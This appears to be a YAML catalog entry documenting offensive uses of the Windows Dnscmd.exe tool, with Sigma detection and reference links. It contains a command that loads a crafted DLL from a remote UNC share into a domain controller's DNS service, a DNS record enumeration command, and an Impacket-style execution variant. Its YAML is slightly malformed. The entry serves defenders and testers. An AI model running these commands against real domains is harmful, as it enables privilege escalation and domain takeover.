---
Name: Dnscmd.exe
Description: A command-line interface for managing DNS servers
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
    Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
    Usecase: Remotely inject dll to dns server
    Category: Execute
    Privileges: DNS admin
    MitreID: T1543.003
    OperatingSystem: Windows server
Commands:
  - Command: dnscmd.exe 127.0.0.1 /enumrecords fakedomain.local
    Description: Enumerates local DNS resource records on the fakedomain.local domain
    Usecase: Enumerate DNS zones for a particular domain. DNS zones are used to host the DNS records for a particular domain.
    Category: Reconnaissance
    Privileges: Domain Administrator, or SYSTEM
    MitreID: TA0007
    OperatingSystem: Windows server
Command: cmd.exe /Q /c powershell.exe dnscmd.exe 127.0.0.1 /enumrecords fakedomain.local @ 1> \\127.0.0.1\ADMIN$\__1659026954.961697 2>&1
    Description: Successful execution of dnscmd.exe to enumerate the DNS zones of fakedomain.local, then redirect the output to the local interface (Impacket Execution) 
    Usecase: Enumerate DNS zones for a particular domain. DNS zones are used to host the DNS records for a particular domain.
    Category: Reconnaissance
    Privileges: Domain Administrator, or SYSTEM
    MitreID: TA0007
    OperatingSystem: Windows server
Full_Path:
  - Path: C:\Windows\System32\Dnscmd.exe
  - Path: C:\Windows\SysWOW64\Dnscmd.exe
Code_Sample:
- Code:
Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/b08b3e2b0d5111c637dbede1381b07cb79f8c2eb/rules/windows/process_creation/process_creation_dns_serverlevelplugindll.yml
 - IOC: Dnscmd.exe loading dll from UNC/arbitrary path
Resources:
  - Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
  - Link: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
  - Link: https://twitter.com/Hexacorn/status/994000792628719618
  - Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd
Acknowledgement:
  - Person: Shay Ber
    Handle:
  - Person: Dimitrios Slamaris
    Handle: '@dim0x69'
  - Person: Nikhil SamratAshok
    Handle: '@nikhil_mitt'
  - Person: Daniel Gott
    Handle: '@gott_cyber'
---
